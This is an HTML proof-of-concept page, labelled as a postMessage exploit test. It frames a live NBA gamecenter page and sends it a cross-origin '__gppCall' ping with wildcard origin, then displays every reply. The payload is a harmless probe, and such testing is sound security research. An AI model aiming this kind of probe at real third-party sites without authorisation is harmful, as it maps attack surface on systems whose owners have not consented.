<!DOCTYPE html>
<html>
  <head>
    <title>PoC postMessage Exploit</title>
  </head>
  <body>
    <h1>postMessage Exploit Test</h1>

    <!-- iframe target -->
    <iframe
      id="targetFrame"
      src="https://gamecenter.nba.com/nba-fankit-v1/production/index.html?h=cdn-us.monterosa.cloud&p=559f4abc-a54e-4c87-98f5-acba50aeb7bb&e=dc5b4dbb-73d5-4b53-a59c-184e46e12b67#/"
      style="width: 100%; height: 600px; border: 1px solid black"
    ></iframe>

    <script>
      const frame = document.getElementById("targetFrame");

      // Tunggu iframe selesai dimuat
      frame.onload = function () {
        console.log("iframe loaded, sending message...");

        // Kirim pesan ke iframe
        frame.contentWindow.postMessage(
          {
            __gppCall: {
              command: "ping",
              parameter: null,
              callId: "exploit123",
            },
          },
          "*"
        );
      };

      // Tangkap respon dari iframe
      window.addEventListener("message", (event) => {
        console.log("received message:", event.data);
        const output = document.createElement("pre");
        output.textContent = JSON.stringify(event.data, null, 2);
        document.body.appendChild(output);
      });
    </script>
  </body>
</html>
